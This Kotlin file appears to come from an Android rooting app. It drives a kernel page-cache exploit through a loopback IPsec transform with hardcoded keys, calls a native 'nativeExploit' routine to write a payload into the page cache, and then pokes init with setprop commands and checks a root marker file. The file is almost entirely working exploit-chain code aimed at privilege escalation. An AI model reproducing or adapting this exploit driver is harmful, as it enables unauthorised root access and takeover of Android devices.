package org.opencrown.app.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.system.ErrnoException
import android.system.Os
import android.system.OsConstants
import android.util.Log
import java.net.InetAddress
import java.util.concurrent.TimeUnit

/**
 * Generic page-cache relay chain.
 *
 * The payload and its supported device/kernel specification come from the
 * payload manifest. This class only performs the IPsec/page-cache write and
 * checks the init relay marker.
 */
class PageCacheRelayChain(private val context: Context) {
    interface Listener {
        fun onLog(line: String)
    }

    private external fun nativeExploit(
        encapPort: Int,
        spi: Int,
        payload: ByteArray,
        keys: ByteArray,
        hmacTruncBytes: Int,
        callback: Any,
    ): String?

    @Suppress("unused")
    fun onNativeProgress(message: String) {
        listener?.onLog(message)
    }

    @Volatile
    private var listener: Listener? = null

    fun run(payload: ByteArray, listener: Listener): Boolean {
        this.listener = listener
        if (!ensureNativeLoaded()) {
            listener.onLog("The privileged relay is not included in this build.")
            return false
        }
        synchronized(RUN_LOCK) {
            var ipsec: IpSecManager? = null
            var spi: IpSecManager.SecurityParameterIndex? = null
            var encap: IpSecManager.UdpEncapsulationSocket? = null
            var transform: IpSecTransform? = null
            return try {
                require(payload.size >= 16) { "empty payload" }
                ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
                    ?: error("IpSecManager unavailable")
                val loopback = InetAddress.getByName("127.0.0.1")
                spi = ipsec.allocateSecurityParameterIndex(loopback)
                val crypt = IpSecAlgorithm("cbc(aes)", AES_CBC_KEY)
                val auth = IpSecAlgorithm("hmac(sha256)", HMAC_SHA256_KEY, HMAC_TRUNC_BITS)
                encap = ipsec.openUdpEncapsulationSocket()
                val port = encap.port
                transform = IpSecTransform.Builder(context)
                    .setEncryption(crypt)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encap, port)
                    .buildTransportModeTransform(loopback, spi)

                val keys = ByteArray(64)
                System.arraycopy(AES_CBC_KEY, 0, keys, 0, 32)
                System.arraycopy(HMAC_SHA256_KEY, 0, keys, 32, 32)
                val result = nativeExploit(port, spi.spi, payload, keys, HMAC_TRUNC_BITS / 8, this)
                listener.onLog(result ?: "native exploit returned no result")
                result?.contains("Verified:") == true &&
                    result?.contains("PAGE CACHE MODIFIED") == true
            } catch (t: Throwable) {
                Log.e(TAG, "page-cache relay failed", t)
                listener.onLog("exploit failed: ${t.javaClass.simpleName}: ${t.message}")
                false
            } finally {
                runCatching { transform?.close() }
                runCatching { encap?.close() }
                runCatching { spi?.close() }
            }
        }
    }

    fun triggerInitLog(): String {
        val token = System.currentTimeMillis().toString()
        val attempts = listOf(
            arrayOf("/system/bin/setprop", "ctl.start", "zzz"),
            arrayOf("/system/bin/setprop", "debug.dirtyinit", token),
            arrayOf("/system/bin/sh", "-c", "setprop ctl.start zzz"),
        )
        for (cmd in attempts) {
            try {
                val process = ProcessBuilder(*cmd).redirectErrorStream(true).start()
                val finished = process.waitFor(2, TimeUnit.SECONDS)
                val output = process.inputStream.bufferedReader().readText().trim()
                if (!finished) process.destroyForcibly()
                if (finished && process.exitValue() == 0) return "init trigger accepted"
                if (output.isNotEmpty()) return output
            } catch (t: Throwable) {
                Log.w(TAG, "trigger attempt failed", t)
            }
        }
        return "init trigger denied"
    }

    fun isRootActive(): Boolean {
        return try {
            Os.stat("/dev/.dfi")
            true
        } catch (e: ErrnoException) {
            e.errno == OsConstants.EACCES || e.errno == OsConstants.EPERM
        }
    }

    companion object {
        private const val TAG = "OpenCrownRelay"
        private const val HMAC_TRUNC_BITS = 128
        private val AES_CBC_KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345".toByteArray(Charsets.US_ASCII)
        private val HMAC_SHA256_KEY = "HMACKEY_FOR_DIRTYINIT_CBC_MODE!!".toByteArray(Charsets.US_ASCII)
        private val RUN_LOCK = Any()
    }

    @Volatile
    private var nativeLoaded = false

    private fun ensureNativeLoaded(): Boolean {
        if (nativeLoaded) return true
        synchronized(RUN_LOCK) {
            if (nativeLoaded) return true
            nativeLoaded = runCatching { System.loadLibrary("pagecache_relay") }.isSuccess
            return nativeLoaded
        }
    }
}